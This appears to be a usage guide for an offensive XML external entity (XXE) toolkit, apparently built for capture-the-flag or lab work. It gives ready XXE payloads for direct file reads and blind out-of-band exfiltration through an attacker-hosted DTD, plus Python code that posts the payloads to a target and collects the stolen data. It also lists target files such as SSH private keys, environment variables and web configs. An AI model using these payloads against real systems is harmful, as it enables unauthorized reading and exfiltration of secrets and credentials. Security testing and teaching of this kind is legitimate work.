# XXE Payload Examples

## Quick Start
```python
from utils.xxe import quick_test

# One function does everything!
payload = quick_test("http://10.10.14.5:8000")

# Send to target
requests.post("http://target/api", data=payload)

# Get exfiltrated data
from utils.server_hooks import get_exfil
data = get_exfil()
```

## Understanding XXE Files

### What Gets Created
- **payloads/xxe/xxe.dtd** - Served from YOUR server, tells target what to steal
- **XXE payload** - XML you send to target, tells it to fetch your DTD

### The Attack Flow
1. Target gets your XXE payload → "Hey, go fetch DTD from attacker's server"
2. Target fetches DTD from you → "OK, now read /etc/passwd and send it back"
3. Target follows DTD instructions → Sends file content to your server
4. You receive the data via `get_exfil()`

## Payload Types

### Basic File Read (Direct Response)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```
Use when: Target returns/displays the XML content directly

### Blind OOB (No Direct Response)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-IP:8000/xxe/xxe.dtd"> %xxe;]>
<root></root>
```
Use when: Target doesn't show output (blind)

### Self-Contained (No External DTD)
```python
from utils.xxe import parameter_entity
payload = parameter_entity("http://10.10.14.5:8000")
```
Use when: You can't/don't want to host files

## Complete Example
```python
from utils.xxe import generate_oob_files
from utils.server_hooks import get_exfil
import requests

# 1. Generate everything
xxe, dtd = generate_oob_files("http://10.10.14.5:8000", "/etc/passwd")

# 2. Read payload
with open(f"payloads/{xxe}") as f:
    payload = f.read()

# 3. Send to target
requests.post("http://vulnerable/api", data=payload)

# 4. Get result
data = get_exfil()
print(f"Got: {data}")
```

## File Targets
- `/etc/passwd` - User list (safe test)
- `/etc/hosts` - Network config
- `/proc/self/environ` - Environment vars
- `/var/www/config.php` - Web configs
- `C:\Windows\System32\drivers\etc\hosts` - Windows
- `/home/user/.ssh/id_rsa` - SSH keys

## Tips
- Start server.py BEFORE sending payloads
- Use `php_filter_b64()` for binary files
- Check `logs/server.ndjson` if get_exfil() returns None
- DTD must be accessible - check firewall rules